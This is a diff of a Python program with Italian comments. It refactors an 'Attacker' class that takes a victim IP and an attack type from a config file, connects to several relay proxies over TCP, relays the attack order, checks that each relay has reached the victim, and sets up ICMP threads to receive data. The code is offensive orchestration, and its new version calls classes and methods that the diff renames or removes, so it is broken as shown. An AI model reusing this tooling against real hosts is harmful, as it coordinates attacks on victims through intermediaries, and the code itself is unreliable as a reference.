@@ -99,96 +99,128 @@ def restart_thread(thread_list:dict[str:threading.Thread]):
     for thread in thread_list.values():
         thread.start()
 
+class Proxy_Data: 
+    def __init__(self, proxy:ipaddress._IPAddressBase): 
+        if not IS_TYPE.ipaddress(proxy): 
+            raise TypeError("proxy non valido") 
+        self.ipaddress:ipaddress.IPv4Address=proxy 
+        self.socket:socket.socket=None 
+        self.thread:threading.Thread=None  
+        self.event:threading.Event=GET.threading_Event() 
+        self.received_data:list[str]=[] 
 
-
-
-#-----------------------------------------
-
-class CONNECTED_PROXY: 
-    proxy_list=None
-    Proxy_Socket:dict[str,socket.socket]={} 
-    Proxy_Thread:dict[str,threading.Thread]={} 
-    Proxy_ThreadingEvent:dict[str,threading.Event]={} #event_proxy_update
-    #1-__init__
-    #2-send_message
-    #3-start_thread
-    def __init__(self,proxy_list:list[ipaddress._IPAddressBase],callback_function):
+class Connected_Proxy: 
+    def __init__(self,proxy_list:list[ipaddress._IPAddressBase]):  
         if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
             raise TypeError("proxy_list non valida") 
-        if not IS_TYPE.callable_function(callback_function): 
-            raise TypeError("callback_function not callable") 
-        self.proxy_list=proxy_list.copy()
-        for proxy in proxy_list: 
-            #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_4_proxy: 
-            if not IS_TYPE.ipaddress(proxy):  
-                self.proxy_list.pop(self.proxy_list.index(proxy))  
-                continue 
+        self.lock_connected_proxy:threading.Lock=GET.threading_Lock() 
+        self.connected_proxy:dict[str,Proxy_Data]=dict() 
+        for proxy in proxy_list:
+            if not IS_TYPE.ipaddress(proxy): 
+                #proxy_list.remove(proxy) 
+                print(f"***\t{proxy} non è un indirizzo valido")
+                continue   
+            if self.connected_proxy.get(proxy.compressed) is None:  
+                self.connected_proxy[proxy.compressed]=Proxy_Data(proxy)
+            else: 
+                print(f"Proxy {proxy} già presente")
+    
+    def conn_2_proxy(self, ip_vittima:ipaddress._IPAddressBase,attack_function:AttackType): 
+        def init_socket(proxy:ipaddress._IPAddressBase): 
+            socket_proxy=None 
+            socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            socket_proxy.settimeout(15) #15 secondi 
+            socket_proxy.connect((proxy.compressed, proxy_port)) 
+            #socket_proxy.connect(("192.168.56.104", 4567)) 
+            #print("SOCKET",socket_proxy) 
+            with self.lock_connected_proxy:
+                self.connected_proxy[proxy.compressed].socket=socket_proxy 
+        def send_conferma(proxy:ipaddress._IPAddressBase,socket_proxy:socket.socket=None): 
+            confirm_msg=( 
+                MSG.CONFIRM_ATTACKER+"|"+ 
+                proxy.compressed+"|"+
+                ip_vittima.compressed+"|"+ 
+                MSG.ATTACK_FUNCTION+"|"+
+                attack_function.name 
+            ) 
+            #TODO implementare metodi per riprovare in caso di fallimento
+            socket_proxy.settimeout(10) 
+            socket_proxy.sendall(confirm_msg.encode()) 
+            print(f"Messaggio di conferma inviato a {proxy}") 
+            socket_proxy.settimeout(10) 
+            data=socket_proxy.recv(1024).decode() 
+            #print(f"Received from {proxy}:{data}") 
+            confirm_msg=( 
+                MSG.CONFIRM_PROXY+"|"+ 
+                proxy.compressed+"|"+
+                ip_vittima.compressed+"|"+ 
+                MSG.ATTACK_FUNCTION+"|"+
+                attack_function.name 
+            ) 
+            if not data or data!=confirm_msg:  
+                raise ValueError(f"Messaggio di conferma non valido per {proxy}") 
+        def wait_update(proxy:ipaddress._IPAddressBase,socket_proxy:socket.socket=None): 
+            confirm_text=( 
+                MSG.CONFIRM_VICTIM+"|"+ 
+                ip_vittima.compressed+"|"+ 
+                proxy.compressed 
+            ) 
+            socket_proxy.settimeout(10) 
+            data_received=socket_proxy.recv(1024).decode() 
+            result=data_received.replace(confirm_text,"") 
+            #print(f"{proxy} è connesso alla vittima? {type(result)} {result}") 
+            if result!="True": 
+                raise ValueError(f"Proxy {proxy} non connesso alla vittima") 
+        def callback(proxy:ipaddress._IPAddressBase=None):  
             try: 
-                socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                socket_proxy.connect((proxy.compressed, proxy_port)) 
-                #socket_proxy.connect(("192.168.56.104", 4567))
-                #print("SOCKET",socket_proxy) 
-                self.Proxy_Socket.update({proxy.compressed:socket_proxy}) 
-                thread=threading.Thread( 
-                    #La callback aspetta l'aggiornamneto dal proxy (wait_proxy_update)
-                    target=callback_function 
-                    ,args=[proxy]
-                ) 
-                self.Proxy_Thread.update({proxy.compressed:thread}) 
-                self.Proxy_ThreadingEvent.update({proxy.compressed:GET.threading_Event()}) 
-            except Exception as e:
-                print(f"CONNECTED_PROXY: {e}") 
-                self.proxy_list.pop(self.proxy_list.index(proxy)) 
-                socket_proxy.close()  
-        print(f"Got all connected proxy") 
-        self.reset_Proxy_ThreadingEvent() 
-        print("Per ogni proxy creato il proprio evento di aggiornamento 'proxy_update'") 
-
-    def send_message(self, ip_vittima:ipaddress._IPAddressBase,attack_function:Enum): 
-        if not IS_TYPE.ipaddress(ip_vittima): 
-            raise TypeError("ip_vittima non vlaido") 
-        
-        for proxy,socket in self.Proxy_Socket: 
-            data=(
-                MSG.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+
-                MSG.ATTACK_FUNCTION+next(iter(attack_function.items()))[0]
-            )
-            socket.sendall(data.encode()) 
-            data=socket.recv(1024).decode()
-            print(f"Socket {proxy} Received: {data}") 
-            if not data or data!=(MSG.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
-                print(f"Close connection for {proxy}")  
-                socket.sendall(MSG.END_COMMUNICATION.encode())
-                socket.close()
-                self.proxy_list.pop(self.proxy_list.index(proxy)) 
-                continue 
-
-    def start_thread(self): 
-        self.reset_thread()
-        for _,thread in self.Proxy_Thread:
-            thread.start() 
-    
-    def wait_thread(self):
-        for thread in self.Proxy_Thread.values():
-            thread.join() 
-        print("Thread all done") 
-    
-    def reset_thread(self): #reset_event_update_foreach_proxy 
-        #reset_event_update_foreach_proxy(self.proxy_list, self.Proxy_ThreadingEvent) 
-        if not IS_TYPE.list(self.proxy_list) or len(self.proxy_list)<=0 or any(not IS_TYPE.ipaddress(ip) for ip in self.proxy_list): 
-            raise TypeError("proxy_list non valido") 
-        if not IS_TYPE.dictionary(self.Proxy_ThreadingEvent) or len(self.Proxy_ThreadingEvent)<=0: 
-            raise TypeError("Proxy_ThreadingEvent non valido")  
-        for _,thread in self.Proxy_Thread:
-            thread.clear() 
-    
+                init_socket(proxy) 
+                print(f"Connessione con {proxy} stabilita") 
+                with self.lock_connected_proxy:
+                    proxy_data=self.connected_proxy.get(proxy.compressed)
+                if not proxy_data or not proxy_data.socket or not IS_TYPE.socket(proxy_data.socket): 
+                    raise ValueError(f"Proxy {proxy} non presente o socket non inizializzato")
+                socket_proxy=proxy_data.socket  
+                send_conferma(proxy,socket_proxy) 
+                print(f"Messaggio di conferma valido per {proxy}")
+                wait_update(proxy,socket_proxy) 
+                print(f"Proxy {proxy} connesso alla vittima") 
+            except Exception as e: 
+                print(f"conn_2_proxy.callback: {e}") 
+                print(f"Connessione con {proxy} fallita") 
+                with self.lock_connected_proxy: 
+                    unusable_proxy.append(proxy) 
+        #----------------------- 
+        unusable_proxy=[] 
+        for proxy in self.connected_proxy.values():  
+            with self.lock_connected_proxy:
+                proxy.thread=threading.Thread( 
+                    #La callback controlla la connesisone fra l'attaccante ed il proxy
+                    target=callback 
+                    ,args=[proxy.ipaddress] 
+                )   
+            proxy.thread.start() 
+        for proxy in self.connected_proxy.values(): 
+            proxy.thread.join() 
+        for unusable in unusable_proxy: 
+            print("Chiusura connessione con proxy inutilizzabile: ",unusable)
+            with self.lock_connected_proxy: 
+                if self.connected_proxy[unusable.compressed].socket: 
+                    try: 
+                        self.connected_proxy[unusable.compressed].socket.sendall(MSG.END_COMMUNICATION.encode()) 
+                        self.connected_proxy[unusable.compressed].socket.close() 
+                    except Exception as e: 
+                        print("conn_2_proxy-> ",e)
+                        print(f"Errore durante la chiusura della connessione con proxy {unusable}") 
+            with self.lock_connected_proxy: 
+                if self.connected_proxy.get(unusable.compressed):
+                    self.connected_proxy.pop(unusable.compressed)
+            print(f"Rimosso proxy inutilizzabile: {unusable}") 
 #-----------------------------------------  
-def load_config_file(default_file_path, path_of_file): 
-    if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
-        if os.path.exists(default_file_path):
-            print(f"File {path_of_file}  non trovato, si usa quello di default")
-            path_of_file=default_file_path
-        else: raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non sono presenti")
+def load_config_file(path_of_file): 
+    if not os.path.exists(path_of_file): 
+        raise FileNotFoundError(f"File {path_of_file} non presente")
+    if not str(path_of_file).endswith(".json"): 
+        raise TypeError(f"File {path_of_file} non JSON file") 
     with open(path_of_file, 'r') as file: 
         print(f"File di configurazione {path_of_file} caricato correttamente") 
         return json.load(file) 
@@ -241,9 +273,9 @@ class ICMP_THREAD:
 
     def __init__(self, proxy_list:list[ipaddress._IPAddressBase], callback_function):  
         if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
-            raise TypeError("proxy_list non vlaida") 
+            raise TypeError("proxy_list non valida") 
         if any(not IS_TYPE.ipaddress(ip) for ip in proxy_list): 
-            raise ValueError("proxy_list non vlaida") 
+            raise ValueError("proxy_list non valida") 
         if not IS_TYPE.callable_function(callback_function): 
             raise TypeError("callback_function not callable")
         self.thread_lock=GET.threading_Lock() 
@@ -256,80 +288,66 @@ class ICMP_THREAD:
                 args=[proxy]
             ) 
             thread.name=f"Thread-{proxy.compressed}" 
-            self.thread_list.update({proxy.compressed:thread}) 
-            self.thread_response.update({proxy.compressed:False}) 
-        print("Definiti il dizionario dei thread") 
+            self.thread_list[proxy.compressed]=thread 
+            self.thread_response[proxy.compressed]=False 
+        print("Definito il dizionario dei thread") 
+        print("Definiti il dizionario delle risposte") 
     
-    def reset_Thread(self): 
-        print("Reimposto i thread che ricevono i dati") 
+    def reset(self): 
+        if not IS_TYPE.dictionary(self.thread_list) or len(self.thread_list)<=0: 
+            raise TypeError("thread_list non valido")  
         for thread in self.thread_list.values():
-            thread.clear()  
+            thread.clear() 
+        print("Thread ICMP reimpostati") 
 
-    def start_Thread(self): 
-        self.reset_Thread()
-        print("Attivo i thread per ricevere i dati") 
+    def start(self): 
+        if not IS_TYPE.dictionary(self.thread_list) or len(self.thread_list)<=0: 
+            raise TypeError("thread_list non valido")  
+        self.reset()
         for thread in self.thread_list.values():
             thread.start() 
+        print("Thread ICMP avviati")
     
-    def wait_Thread(self): 
-        print("Asptto che i thread terminino") 
+    def wait(self):  
+        if not IS_TYPE.dictionary(self.thread_list) or len(self.thread_list)<=0: 
+            raise TypeError("thread_list non valido")  
         for thread in self.thread_list.values():
             #thread.wait()  
             thread.join()  
+        print("Thread ICMP terminati")
 
 #-----------------------------------------  
 default_file_path:str = "./attack_file.json" 
-proxy_port=4567
+proxy_port=4567 
+
 class Attacker: 
     dati_separati={} 
     connected_proxy:CONNECTED_PROXY=None 
-    received_data:dict[str,list]={} 
 
     attack_type:AttackType=None
     ip_vittima:ipaddress._IPAddressBase=None
     ip_host:ipaddress._IPAddressBase=None
     
-    def __init__(self):  
-        args=GET_ARGS.from_parser(self)  
-        if not IS_TYPE.namespace(args): 
-            exit(-1) 
-        config_file=load_config_file(
-            default_file_path, args.file_path
-        ) 
-        self.set_variables(config_file) 
-    
-    def set_variables(self,config_file): 
+    def __init__(self): 
         def get_attacco(): 
             attack_type=AttackType.get_attack_method(config_file.get("attack_function"))
             if not IS_TYPE.enum(attack_type,AttackType): 
                 #raise TypeError("attack_type non valido") 
                 attack_type=AttackType.choose_attack_function()  
             if not IS_TYPE.enum(attack_type, AttackType): 
-                raise TypeError("attack_type non valido") 
-            print("Attacco selezionato:", attack_type) 
-            return attack_type
+                raise TypeError("Attacco non valido:",attack_type) 
+            return attack_type 
         def get_vittima(): 
             ip_vittima=ipaddress.ip_address(config_file.get("ip_vittima", None)) 
-            print(f"IP vittima: {type(ip_vittima) } {ip_vittima }")
-            return ip_vittima
+            return ip_vittima 
         def get_ip_host(): 
             ip_host, errore=NETWORK.IP.find_local_IP() 
             if errore:
                 print("errore:",errore)  
                 msg="Inserire indirizzo IP dell'host:\n\t#" 
-                try: 
-                    ip_host=ipaddress.ip_address(input(msg)) 
-                except Exception as e: 
-                    print(e) 
-                    return None
-            try: 
-                #TODO eliminare alla fine
-                #self.ip_host=ipaddress.ip_address("192.168.56.104") 
-                ip_host=ipaddress.ip_address(ip_host) 
-            except Exception as e: 
-                print(e) 
-                return None
-            print(f"ip_host: {type(ip_host)} {ip_host}") 
+                ip_host=input(msg) 
+            #self.ip_host=ipaddress.ip_address("192.168.56.104") #TODO eliminare alla fine
+            ip_host=ipaddress.ip_address(ip_host) 
             return ip_host
         def get_proxy_list():  
             proxy_list:list[ipaddress._IPAddressBase]=[]
@@ -339,32 +357,43 @@ class Attacker:
                     proxy_list.append(proxy_ip)  
                 except ValueError as e:
                     print(f"get_proxy_list: {e}") 
+            if len(proxy_list)<=0: 
+                raise ValueError("Lista proxy vuota:",proxy_list) 
+            if any(not IS_TYPE.ipaddress(proxy) for proxy in  proxy_list): 
+                raise ValueError("Uno o più IP Proxy non validi:",proxy_list) 
             print(f"Lista proxy sanificata") 
             return proxy_list 
-        #----------------------
+        #--------------------------
+        args=GET_ARGS.from_parser(self)  
+        if not IS_TYPE.namespace(args): 
+            exit(-1) 
+        try: 
+            config_file=load_config_file(args.file_path) 
+        except Exception as e: 
+            print(e) 
+            config_file=load_config_file(default_file_path) 
         self.attack_type=get_attacco() 
+        print("Attacco selezionato:", self.attack_type) 
         self.ip_vittima=get_vittima() 
-        self.ip_host=None
-        while not IS_TYPE.ipaddress(self.ip_host): 
-            self.ip_host=get_ip_host() 
-        proxy_list=get_proxy_list()
-        print("CONNESSIONE CON I PROXY")
-        self.connected_proxy=CONNECTED_PROXY(proxy_list, self.wait_proxy_update) 
+        print(f"IP vittima: {type(self.ip_vittima) } {self.ip_vittima }")
+        self.ip_host=get_ip_host() #prima era None
+        #while not IS_TYPE.ipaddress(self.ip_host): 
+        #    self.ip_host=get_ip_host() 
+        print(f"ip_host: {type(self.ip_host)} {self.ip_host}") 
+        self.connected_proxy=CONNECTED_PROXY(get_proxy_list()) 
+        print(f"Got all connected proxy") 
         if len(self.connected_proxy.proxy_list)<=0: 
-            print("NESUSN PROXY DISPONIBILE")
+            print("Nessun Proxy disponibile")
             exit(0) 
-        for proxy in proxy_list: 
-            self.received_data.update({proxy.compressed:[]}) 
-        self.connected_proxy.send_message( self.ip_vittima,self.attack_type)
-        self.connected_proxy.start_thread() 
-        self.connected_proxy.wait_thread() 
+        #--------------------
+        self.connected_proxy.connect2proxies(self.ip_vittima,self.attack_type)
+        self.connected_proxy.start() 
+        self.connected_proxy.wait() 
         #thread_list=connected_proxy.Proxy_Thread
-        #dict_proxy_socket=connected_proxy.Proxy_Socket  
+        #dict_proxy_socket=connected_proxy.Proxy_Socket 
     
     def send_command_to_victim(self): 
-        self.data_lock=GET.threading_Lock()
-        self.connected_proxy.set_Proxy_ThreadingEvent()
-        #event_thread_update -> self.connected_proxy.Proxy_ThreadingEvent 
+        self.data_lock=GET.threading_Lock() 
         self.icmp_thread=ICMP_THREAD(self.connected_proxy.proxy_list, self.wait_proxy_update) #thread_lock, thread_proxy_response, thread_list
         self.event_received_data=GET.threading_Event() 
         self.icmp_thread.start_Thread() 
@@ -412,29 +441,7 @@ class Attacker:
             socket_proxy.sendall(MSG.END_COMMUNICATION.encode()) 
             socket_proxy.close()
 
-
-    def wait_proxy_update(self, proxy:ipaddress._IPAddressBase):  
-        if not IS_TYPE.ipaddress(proxy): 
-            raise TypeError("proxy non valido") 
-        #
-        proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
-        confirm_text=MSG.CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
-        data_received=proxy_socket.recv(1024).decode()
-        if confirm_text not in data_received: 
-            self.dict_proxy_socket.pop(proxy.compressed)
-            proxy_socket.close()  
-            self.proxy_list.pop(self.proxy_list.index(proxy)) 
-            raise Exception(f"{proxy.compressed}: dati ricevuti invalidi {data_received}")
-        result=data_received.replace(confirm_text,"")
-        print(f"{proxy} è connesso alla vittima? {type(result)} {result}")
-        if result!="True":
-            print(f"Proxy {proxy} non connesso alla vittima")
-            self.dict_proxy_socket.pop(proxy.compressed)
-            proxy_socket.close()  
-            self.proxy_list.pop(self.proxy_list.index(proxy)) 
-            return False 
-        print(f"Proxy {proxy} connesso alla vittima")
-        return True 
+    
     
     def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
         print("wait_data_from_proxy")
